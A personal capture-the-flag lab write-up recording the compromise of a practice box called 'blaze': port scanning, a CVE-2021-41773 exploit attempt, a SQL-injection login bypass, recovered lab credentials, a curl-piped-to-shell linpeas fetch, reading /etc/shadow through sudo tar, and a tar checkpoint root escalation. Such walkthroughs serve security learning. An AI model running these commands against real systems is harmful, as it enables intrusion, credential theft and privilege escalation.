## Nmap

```nmap-tcp
??$ nmap -sC -sV -T 4 -p- 192.168.53.10
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-24 02:50 UTC
Nmap scan report for 192.168.53.10
Host is up (0.0069s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp   open  http            Apache httpd 2.4.41 ((Ubuntu))
|_http-title: blaze
|_http-server-header: Apache/2.4.41 (Ubuntu)
9090/tcp open  ssl/zeus-admin?
| ssl-cert: Subject: commonName=blaze/organizationName=d2737565435f491e97f49bb5b34ba02e
| Subject Alternative Name: IP Address:127.0.0.1, DNS:localhost
| Not valid before: 2024-01-24T02:50:54
|_Not valid after:  2123-12-31T02:50:54
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     request
|     </title>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <style>
|     body {
|     margin: 0;
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|     font-weight: 300;
|     margin: 0 0 10px;
|_    @font-face {
|_ssl-date: TLS randomness does not represent time
```



### Port 80

Just a dummy apache site - apache 2.4.41
Tried cve-2021-41773:

```apache-rce-exploit
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2";
```

**Did not work**

Tried dirbuster
no luck but there is a login.php

**HAD TO REVERT**

Used auth bypass from [seclists](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt):
	'OR '' = '
*BOOTY*:
james 	Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI= canttouchhhthiss@455152
cameron 	dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy thisscanttbetouchedd@455152

Grabbed above plaintext for hashes from [hashes.com](https://hashes.com)

Logged in on port 9090 with james and canttouchhhthiss@455152

### Port 9090

Seems to be a config panel/admin type deal for server blaze - need password

Logged in via creds from port 80

Blaze system admin portal - terminal tab to establish reverse shell

## Foothold

Ran LinPeas

```linpeas
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

Used sudo for james with no password to do tar -czvf to make backups

```priv-esc
 sudo -l
Matching Defaults entries for james on blaze:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on blaze:
    (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
$ sudo /usr/bin/tar -czvf /tmp/backup.tar.gz /etc/shadow

```

Got creds for root by viewing shadow file:

`root:$6$tweYyLabcuCnm5SJ$9gQ018URlPi8f0dq6u243E7eNeBzv6p8OiHMSPoHvHJcwQ6o.l0oxvoue0nWhBoYqUiiqtxswml6Az3fOGLt8/:19445:0:99999:7:::`

Couldn't crack

Looked up tar on GTFOBins

```priv-esc-done
sudo tar -czvf /tmp/backup.tar.gz * --checkpoint=1 --checkpoint-action=exec=/bin/sh
```